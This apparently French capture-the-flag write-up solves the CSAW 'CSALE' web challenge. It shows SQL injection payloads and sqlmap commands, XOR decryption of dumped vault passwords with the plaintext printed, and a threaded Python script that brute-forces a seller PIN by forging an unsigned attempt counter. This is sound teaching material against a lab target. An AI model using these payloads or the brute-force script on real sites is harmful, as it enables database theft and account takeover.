+++
date = '2026-10-02T20:51:57-04:00'
draft = true
title = 'CSALE (Web)'
author = ''
+++

> _Welcome to the CSAW Store, we have a special CSALE going on. Enjoy the deals... and bugs...!

<!--more-->

**Flag :** `csawctf{tH4ts_R0ugH_B4dDy}`

**Cible :** application Flask (`Server: gunicorn`), back-end **SQLite**, port 5000.
*(l'instance était redéployée souvent → IP + cookie de session qui changent à chaque restart : `10.0.163.x` → `10.0.186.187` → `10.0.186.246`…)*

**TL;DR :**
1. **SQLi UNION** dans le paramètre de recherche `q` → dump de la base.
2. Reconstruction d'une **clé XOR** (table `password_notes`) → déchiffrement des mots de passe (`password_vault`) → login.
3. Un premier "flag" trouvé est un **leurre** (image générée : *"do not submit this AI flag"*).
4. Le vrai flag est dans un **unlisted draft protégé par un PIN 4 chiffres** (10 essais max).
5. Le **compteur d'essais est côté client** (champ `n` dans un base64 non signé `lock_state`) → on le force à `0` → **brute-force illimité** du PIN → déverrouillage du draft de **Zuko** → flag.

---

## 1. Reconnaissance & découverte de la SQLi

Marketplace avec une recherche `GET /?q=<terme>`. Test avec des quotes :

| Payload (`q=`) | Réponse | Interprétation |
|----------------|---------|----------------|
| `'` | 200 (aucun résultat) | reflété dans `<input value>` |
| `' OR '1' = '1` | **200** - tous les listings | condition vraie, quotes équilibrées |
| `' OR '1' = '1'` | **500** Internal Server Error | quote impaire → syntaxe cassée |

![OR 1=1](images/Screenshot%202026-09-19%20111317.png)
![Quote impaire → 500](images/Screenshot%202026-09-19%20111442.png)

Oracle exploitable : **200 = requête valide / 500 = syntaxe cassée**.

---

## 2. Faire fonctionner sqlmap

On capture d'abord la requête GET dans Burp pour la sauvegarder en `req.txt` :

![Contenu de req.txt](images/Screenshot%202026-09-21%20152513.png)

Avec cette requête, un simple `sqlmap -r req.txt --batch` ne détecte rien : sqlmap dit que `q` n'est pas injectable. Pourquoi ?

1. `q` est marqué "not dynamic" parce que la valeur est reflétée dans le HTML, donc l'heuristique ne voit pas de diff nette.
2. sqlmap interprète les **500 comme des erreurs** réseau, pas comme la réponse *False* d'un test booléen.
3. Par défaut, **SQLite n'est pas testé**. Or SQLite ne supporte ni error-based, ni time-based (`SLEEP()` n'existe pas), ni stacked queries. Seuls **boolean** et **UNION** marchent.

### Commande gagnante

```bash
sqlmap -r req.txt --batch --dbms=sqlite --technique=BU --level=5 --risk=3 --code=200
```

- `--dbms=sqlite` : force les payloads SQLite
- `--code=200` : indique que HTTP 200 = vrai, donc les 500 deviennent le *False*
- `--technique=BU` : Boolean + Union uniquement

Résultat : injectable, **7 colonnes**, breakout réel = **`test')`** (il y avait une **parenthèse** dans la requête, ce qui explique pourquoi un `ORDER BY` manuel sans `)` cassait tout).

![sqlmap détecte l'injection SQLite](images/Screenshot%202026-09-19%20112650.png)

---

## 3. Dump & déchiffrement des comptes

```bash
sqlmap -r req.txt --batch --dbms=sqlite --dump
```

5 tables. Les 3 qui comptent :

**`users`** - hash `scrypt` **incassables** (leurre).

**`password_notes`** - morceaux de clé avec un ordre (`phase`) :

| phase | key_piece |
|-------|-----------|
| 1 | 2224 |
| 2 | 9278 |
| 3 | 2472 |
| 4 | 6671 |
| 5 | 5905 |

**`password_vault`** - mots de passe en clair **chiffrés en XOR** (hex).

### Clé XOR = key_piece triés par phase

```
2224 · 9278 · 2472 · 6671 · 5905  →  "22249278247266715905"
```

Script de déchiffrement (XOR répété) :

```python
key = b"22249278247266715905"
vault = {
    1:"425341474e5d455c030604", 2:"7b1f7379667a72716171797063647076706b",
    3:"7f7d7c71606b6e616b6d6e6b6f6f6e68", 4:"71535c134d6d435747575f6d425e5e42534b5647",
    5:"41465d465450584a5c6b4353445156434c585e6a405b555c4d5442545a515e401947425450576f45405d46515a46584a6d5958465e53455e535d4254555d5c4766595f595e5152415f69425f574c425b466d50465c535c5d405b51515e575e5f46",
    6:"7c777770747d657d62757e7c62", 7:"575c585b406d4350576b54465069505e5a5d6f5947515915",
    8:"7d5657554d5a755d517b7a777b4f755d545d757a7c515779764052", 9:"5b1f7a556f571a6a7753567b7873536e58606f5d027c7d4618",
}
users = {1:"superdiscreetflaguser",2:"Walter_W",3:"Mr.Krabs",4:"Gojo",
         5:"Daenerys",6:"Zoro",7:"OSIRIS",8:"Maliketh",9:"Zuko"}
for uid,h in vault.items():
    d = bytes(b ^ key[i%len(key)] for i,b in enumerate(bytes.fromhex(h)))
    print(f"{uid} {users[uid]:<22} {d.decode(errors='replace')}")
```

Sortie (mots de passe en clair) :

```
1 superdiscreetflaguser  password123
2 Walter_W               I-AM_HEISENBURGGER
3 Mr.Krabs               MONEYYYYYYYYYYYY
4 Gojo                   Can't_touch_thisfrfr
5 Daenerys               stormborn_targaryan_rightfulheir/queen_protector_...
6 Zoro                   NEEDMOREPAINT
7 OSIRIS                 enjoy_the_ctf_good_luck!
8 Maliketh               OdeathBecOMEMyBladEONceMOre
9 Zuko                   i-HaVe-REgaINEd_mY_h0NOr!
```

![Script XOR](images/Screenshot%202026-09-19%20113021.png)

On peut maintenant se connecter en tant que n'importe quel vendeur.

---

## 4. Le leurre (piège à éviter)

Connecté en `superdiscreetflaguser` / `password123`, la page **Unlisted drafts** montre un draft "Flag upload proof" avec une image :

![Faux flag](images/Screenshot%202026-09-19%20113118.png)

Le texte imprimé `csawctf{Th1s_1S_4asy_r1gh1!?}` est un **faux flag** : l'écriture manuscrite en arrière-plan dit **« do not submit this AI flag - you will be destroyed »**. Cohérent avec la note du challenge (*"beta version accidentally released… source removed since it was inaccurate"*). **Ce flag ne valide pas.**

---

## 5. Le vrai vecteur : bypass du seller-lock PIN

Les autres comptes ont des drafts **verrouillés par un PIN à 4 chiffres**, avec **10 essais max** (brute-force web des 10000 combos impossible) :

> Unlisted drafts - *Seller-lock protected* - **PIN attempts: 0 / 10**

Le PIN **n'est pas en base** (dump = 5 tables, aucune colonne `pin`) → la SQLi ne le donne pas. On attaque donc la **logique de déverrouillage**. Requête de l'endpoint (Burp) :

```
POST /account/unlisted/unlock
Cookie: session=eyJwYXNzd29yZF92ZXJpZmllZCI6ZmFsc2UsInVzZXJfaWQiOjl9.aq613A.<sig>

lock_state=eyJ2IjoxLCJ1Ijo5LCJuIjowfQ&pin=0000
```

Décodage base64 :

```
session    → {"password_verified":false,"user_id":9}      (signé HMAC - non falsifiable)
lock_state → {"v":1,"u":9,"n":0}                            (base64 NON signé - falsifiable !)
```

**La faille :** le compteur d'essais est le champ **`n` de `lock_state`**, un base64 **sans signature** contrôlé par le client. La session (signée) ne contient pas `n`. Donc en renvoyant **`n=0` à chaque requête**, la limite des 10 essais est neutralisée → **brute-force illimité** du PIN.

- `v` = version, `u` = user_id ciblé, `n` = **compteur d'essais → forcé à 0**

### Script de brute-force

```python
import requests, base64, json
from concurrent.futures import ThreadPoolExecutor, as_completed

HOST   = "10.0.186.246:5000"
COOKIE = "session=eyJwYXNzd29yZF92ZXJpZmllZCI6ZmFsc2UsInVzZXJfaWQiOjl9.aq613A.<sig>"
TARGET_U = 9   # Zuko

URL = f"http://{HOST}/account/unlisted/unlock"
HEADERS = {"Cookie": COOKIE, "Content-Type": "application/x-www-form-urlencoded",
           "Origin": f"http://{HOST}", "Referer": f"http://{HOST}/account/unlisted"}

def lockstate(u, n=0):
    raw = json.dumps({"v":1,"u":u,"n":n}, separators=(",",":")).encode()
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

LOCK = lockstate(TARGET_U, 0)          # n=0 -> essais illimités
s = requests.Session()
base = s.post(URL, data={"lock_state": LOCK, "pin": "0000"}, headers=HEADERS, allow_redirects=False)

def test(i):
    pin = f"{i:04d}"
    r = s.post(URL, data={"lock_state": LOCK, "pin": pin}, headers=HEADERS, allow_redirects=False)
    if r.status_code != base.status_code or abs(len(r.text)-len(base.text)) > 20 or "csawctf" in r.text.lower():
        return (pin, r)

with ThreadPoolExecutor(max_workers=30) as ex:
    for f in as_completed([ex.submit(test, i) for i in range(10000)]):
        res = f.result()
        if res:
            pin, r = res
            print(f"[HIT] pin={pin} code={r.status_code}"); break
```

- **Baseline** (mauvais PIN) = `403`. Le fait que la longueur reste constante sur des centaines de requêtes prouve qu'aucun rate-limit ne s'applique → bypass confirmé.
- **Hit** : le bon PIN renvoie `302` (redirection vers `/account/unlisted`, `password_verified` passe à `true`).

Résultat sur le compte **Zuko (u=9)** :

```
[HIT] pin=7858 code=302 len=221
Location: /account/unlisted
```

![Brute-force → PIN 7858 (Zuko)](images/Screenshot%202026-09-19%20122521.png)

---

## 6. Récupération du flag

Draft de Zuko déverrouillé → **"Recovered photo proof"**, l'image jointe contient le vrai flag manuscrit :

![Vrai flag](images/Screenshot%202026-09-19%20122030.png)

```
csawctf{tH4ts_R0ugH_B4dDy}
```

---

## Résumé de la chaîne

1. **SQLi UNION** (`q`, contexte `test')`, 7 colonnes, SQLite) → dump.
2. **Clé XOR** = `password_notes.key_piece` triés par `phase` = `22249278247266715905`.
3. **Déchiffrement** de `password_vault` → mots de passe en clair → login sur tous les comptes.
4. Ignorer le **faux flag** (`superdiscreetflaguser`, image "do not submit this AI flag").
5. **Bypass du seller-lock** : compteur d'essais `n` dans le `lock_state` base64 **non signé** → `n=0` → brute-force illimité du PIN.
6. **PIN 7858** sur **Zuko** → draft "Recovered photo proof" → flag.

## Leçons

- **SQLi + 500 partout** : donner l'oracle à sqlmap (`--code=200`) et **forcer `--dbms`** (SQLite change les techniques disponibles).
- **Ne jamais faire confiance à un état côté client** : ici le compteur anti-brute-force vivait dans un base64 non signé (`lock_state`), pas dans le cookie signé → contournable trivialement. Une valeur de sécurité doit être signée **et** vérifiée côté serveur.
- Les **hash `scrypt`** et le **faux flag IA** étaient des leurres pour faire perdre du temps.
